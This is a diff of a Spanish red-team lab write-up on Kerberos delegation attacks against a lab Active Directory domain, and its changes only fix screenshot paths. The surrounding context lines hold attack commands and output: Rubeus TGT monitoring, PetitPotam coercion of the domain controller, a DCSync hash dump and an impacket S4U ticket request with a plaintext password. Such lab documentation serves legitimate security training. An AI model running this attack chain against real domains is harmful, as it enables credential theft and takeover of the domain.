@@ -48,7 +48,7 @@ sAMAccountName: sql_svc
 | `524800` = `0x80200` | `NORMAL_ACCOUNT (0x200)` + `TRUSTED_FOR_DELEGATION (0x80000)` → **Unconstrained Delegation** |
 | `16777728` = `0x1000200` | `NORMAL_ACCOUNT (0x200)` + `TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)` → **Constrained Delegation** |
 
-> 📸 Captura: ![fase11-01](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-01-delegation-enum.png)
+> 📸 Captura: ![fase11-01](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-01-delegation-enum.png)
 
 ---
 
@@ -86,7 +86,7 @@ upload /opt/redteam/windows/Rubeus.exe
 .\Rubeus.exe monitor /interval:5 /nowrap
 ```
 
-> 📸 Captura: ![fase11-02](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-02-rubeus-monitor-tgt-captured.png)
+> 📸 Captura: ![fase11-02](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-02-rubeus-monitor-tgt-captured.png)
 
 **Resultado inmediato:** Rubeus captura automáticamente el TGT de `DC-01$@ATACKCORP.LOCAL` — el DC se autentica periódicamente contra sql_svc por la configuración de delegación.
 
@@ -117,8 +117,8 @@ python3 /opt/redteam/PetitPotam.py \
 [+] Attack worked!
 ```
 
-> 📸 Captura: ![fase11-04](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-04-petitpotam-coercion.png)
-> 📸 Captura: ![fase11-05](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-05-rubeus-fresh-tgt.png)
+> 📸 Captura: ![fase11-04](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-04-petitpotam-coercion.png)
+> 📸 Captura: ![fase11-05](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-05-rubeus-fresh-tgt.png)
 
 **Mecanismo:** PetitPotam abusa de MS-EFSRPC para forzar al DC a autenticarse via NTLM contra Kali. Esto genera un TGT fresco del DC que Rubeus captura en la sesión de sql_svc.
 
@@ -142,7 +142,7 @@ iis_svc:1109:      b329981877f0ca1243192863f356a2f9
 fin.garcia:1105:   ca4d343543c50f99cececfe83bddd4c1
 ```
 
-> 📸 Captura: ![fase11-06](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-06-dcsync-unconstrained.png)
+> 📸 Captura: ![fase11-06](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-06-dcsync-unconstrained.png)
 
 ---
 
@@ -185,7 +185,7 @@ impacket-getST atackcorp.local/iis_svc:'IISService2024!' \
 [*] Saving ticket in Administrador@MSSQLSvc_dc01.atackcorp.local:1433@ATACKCORP.LOCAL.ccache
 ```
 
-> 📸 Captura: ![fase11-07](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-07-constrained-delegation-s4u.png)
+> 📸 Captura: ![fase11-07](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-07-constrained-delegation-s4u.png)
 
 ### 3.3 Verificación del ticket
 
@@ -209,7 +209,7 @@ impacket-getST atackcorp.local/iis_svc:'IISService2024!' \
 
 **Esto es correcto** — Constrained Delegation funciona como se espera. El KDC rechaza la delegación hacia SPNs no autorizados.
 
-> 📸 Captura: ![fase11-08](../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-08-constrained-delegation-proof.png)
+> 📸 Captura: ![fase11-08](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-08-constrained-delegation-proof.png)
 
 ---
 
